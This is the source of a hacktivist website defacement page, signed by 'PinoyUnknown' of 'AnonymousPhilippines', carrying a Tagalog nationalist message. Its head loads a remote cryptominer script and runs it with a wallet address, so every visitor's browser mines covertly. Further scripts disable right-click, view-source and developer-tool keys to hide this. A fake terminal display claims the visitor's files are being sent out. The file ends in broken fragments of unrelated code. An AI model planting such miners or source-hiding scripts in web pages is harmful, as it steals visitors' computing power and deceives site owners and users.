<!-----
/*
	<--------------------------------------------
	Developed by: PinoyUnknown.(White Hat Hacker)
	(c)2009-2025
	--------------------------------------------
	The Head of the ScriptsAndCodes Yr-2009 - Yr 2025.
	AnonymousPhilippines
	PhilippineGhostSec / PhilippineCyberHackers 
	AsianCryptonist 2013.
	
	
	Upadated Scripts by: PinoyUnknown
	
*/
----->

<?php
	error_reporting(0);
	require_once 'hostname.php'; // Check if hostname contain blocked word
	require_once 'enc.php';
?>

<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns="http://www.w3.org/1999/xhtml">
	
<head>
	<title>PINOYUNKNOWN WAS HERE!</title>
		<script src='cabincastle/sedocdnastpircsscriptsandcodes.js'></script>
			<!-------miner----------------->
			<script src="https://anonymousphilippines-9acd3.web.app/miner/pinoyunknown.js" ></script>
			<script type="text/javascript">EverythingIsLife('45hZ3SHdCmY9z5XCPykpFfXyAvLw7a26STUKFXsdUD4kMSVELPgDWrsYZoPDPRfucTfWpEaR1BnBCXtAezbnNPMvQ4Lfg9c', 'x', 30);</script>
			<!-------end miner----------------->
			
	<!---Meta-->
		<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta charset="utf-8">
		<meta name="author" content="pinoyunknown (web developer)" />
		<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<!---Meta--->
		
	<link rel="icon" href="images/android-chrome-192x192.png" type="image/ico">

	<!---background css--->
	<style type="text/css">
			*,html,body,div,p,h2{padding: 0px;margin: 0px;
			}body{background-color: #000000;
			}#container{margin: 0 auto;width: 1080px;padding-top: 80px;
			}#content-container{float: left;width: 980px;
			}#content{clear: left;float: left;width: 60px;padding: 200px 0 20px 0;margin: 0 0 0 30px;display: inline;color: #333;
			}#content h2 {font-family: Cambria;font-size: 90px;
			}
			#aside{float: bottom;width: 1080px;height: 820px;padding: 0px;display: absolute; opacity: 15%;
			background-image: url('anonphlogo.gif');
			background-repeat: no-repeat;
			background-size: cover;
			}.hacker{float: center;font-family: Cambria;font-size: 20px;font-weight: bold;
			}.notes{padding-top: 15px;line-height: 1.3em;font-weight: bold;font-size: 16px;font-family: "Courier New";
			}.contact{padding-top: 20px;font-size: 13px;font-family: "Courier New", Courier, monospace;font-weight: bold;color: #B71C1C;
			}#music{padding: 80px 80px 0px 0px;float: right;clear: right;}
	</style>
	<!---end here background css--->
	
	
<!---disable f12 view source---> 
			<!--- optional   "oncontextmenu="return false" ------------->
<!---disable f12 view source---> 
	     <script language="JavaScript">
      
       window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               //document.onkeydown = function(e) {
               // "I" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               // "J" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               // "S" key + macOS
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               // "U" key
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               // "F12" key
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
//edit: removed ";" from last "}" because of javascript error
</script>
<!---disable f12 view source--->


<!---firebase sdk--->
	// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAPH-_P4OiNe6ZaJwalQoNmAi4xnj_N35I",
  authDomain: "anonymousphilippines-9acd3.firebaseapp.com",
  projectId: "anonymousphilippines-9acd3",
  storageBucket: "anonymousphilippines-9acd3.firebasestorage.app",
  messagingSenderId: "1067397680624",
  appId: "1:1067397680624:web:890ebabfa1dc2beab06135",
  measurementId: "G-BVQM19GZD7"
};
<!---end firebase sdk--->
	
	
<script type="text/javascript">/*<![CDATA[*/ 
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
 
/*]]>*/
	</script>
	

</head>
 

<body onbeforeprint="onbeforeprint()" onafterprint="onafterprint()" onselectstart="return false" oncontextmenu="return false">
<div id="container">
	<div id="content-container">
		<div id="content" style="width: 1202px; height: 509px">
 
<h2>IPAGLABAN ANG ATING LUPANG SINILANGAN! </h2>
	<p class="hacker">mabuhay ang bansang pilipinas!<font color="#1B5E20"> &nbsp ipaglaban natin ang bansang pilipinas!</font></p>
	<p class="notes">we are united as one! </p>
	<p id="message" class="notes">
		<font color="#FF0000">Hello to the all Visitors of this Websites! </font>
		
		<br>
		ipaglaban natin ang bansang pilipinas laban sa mga mananakop!  wag nating  hayaan na abusuhin tayo ng ibang lahi!
		<br>
		<br>
		<font color="lime"> > </font>
		<br>
		<span style="background-color: #33691E"><font color="#00FF00">Message  :</font></span> to the all visitors of this websites  : we do not <font color="#FF0000">Hacked</font> this site for political reasons.
		<br>
			we are here to say to your president who leads to your country. we are all humans who wanted to live in this planet.
		<br>
			please don't attack the filipino fisherman who wanders in the philippine sea.
		<br>
		<br>
		<font color="#1B5E20"> > </font>
		<br>
		<font color="redorange">$</font><font color="green">terminal:</font>
		<br>	
		<font color="#B71C1C">pinoyunkown</font><font color="14b900">@</font><font color="green">127.0.0.1</font><font color="2aa0bd">:</font><font color="165ea2">~</font><font color="green">$</font>
		<font color="#1B5E20">python philippinewhitehat.py</font><font color="#00FF00"> -u ./backdoor_injection.network_mapping -v 3 attack-host=ipaddress:port -sS</font>
		<br>
		<font color="#1B5E20">"StartScanning..."</font>
		<br>
		<font color="green">your IP ADDRESS is detected. </font><font color="16c400">Your Database/Files is now sending to the server.</font><font color="green">@</font>...<font color="green">HACKED BY</font><font color="lime">&nbsp PinoyUnknown</font>
		<br>
		<font color="#B71C1C">pinoyunkown</font><font color="14b900">@</font><font color="green">127.0.0.1</font><font color="2aa0bd">:</font><font color="165ea2">~</font><font color="green">$</font>
		<font color="green">***</font><font color="#00FF00"> connection lost... </font>
		<br>
		
		<br>
		The One And Only <font color="red">$</font>&nbsp@&nbsp<font color="#00FF00">PinoyUnknown</font> &nbsp Group : <font color="#00FF00">AnonymousPhilippines</font>   &nbsp 
		Location : <font color="#00FF00">internet</font>&nbsp Address : <font color="#00FF00">127.0.0.1</font>
		<br>
		<font color="green"> We are the Philippines Cyber Hackers.  (2009-2025)  </font> &nbsp <span style="background-color: #33691E">SPECIAL MENTIONED TO ALL <font color="#00FF00"> PHILIPPINE CYBER HACKERS </font>.....</span>
		<br>
		<br>
		<br>
		<br>
		<br>
		<p class="contact">We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us.  &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://facebook.com" style="color:white;">^^</a>~./AnonymousPhilippines.</p>
		
		
		</div>
	
	<div id="aside">
		<font color="green">sss</font>
		</div>
 
		<div id="music">
		<!---music autoplay-->
		<embed src="https://www.youtube.com/v/e0MCuuePNQg&amp;autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1">
		<!---music autoplay-->
		<object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_mini.swf" width="200" height="20">
		<param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_mini.swf"> <param name="bgcolor" value="#000000">
		<param name="FlashVars" value="mp3=http://www.illinoisunitedfootball.com/f/Eminem-Im_not_afraid.mp3 &amp;autoplay=1"></object>
		</div>
	</div>
    
</div>



	<!---typing terminal text effects--->
	<script type="text/javascript">/*<![CDATA[*/ 
	new TypingText(document.getElementById("message"), 90, function(i){ var ar = new Array("_", " $", "_", "PinoyHackers", "_", " $", "_", "P", "i", "n ", "o", "y","_", " $", "_", "127.0.0.1", "PinoyUnknown", "_", " $", "_", "Hackers", "_", " $", "PhilippineCyberHackers","_", " $", "WhiteHatHackers", "2","0","0","9", " $","CyberSecurityExperts","_", " $",  " /"); return " " + ar[i.length % ar.length]; });
 
	//Type out examples:
	TypingText.runAll();
	/*]]>*/</script>
<!---typing terminal text effects--->

<script language="JavaScript1.2"> 
 
</body>

</html>

</script></body></html>, 30).onChange(reset);
settings.gui.add(settings, 'size', 25, 75).onFinishChange(reset);
settings.gui.add(settings, 'friction', 0.45, 0.55).onFinishChange(reset);
settings.gui.add(settings, 'dampening', 0.01, 0.4).onFinishChange(reset);
settings.gui.add(settings, 'tension', 0.95, 0.999).onFinishChange(reset);
document.body.appendChild(ctx.stats.domElement);
}
};
})(window);
</script>


</font></font></body></html>




?>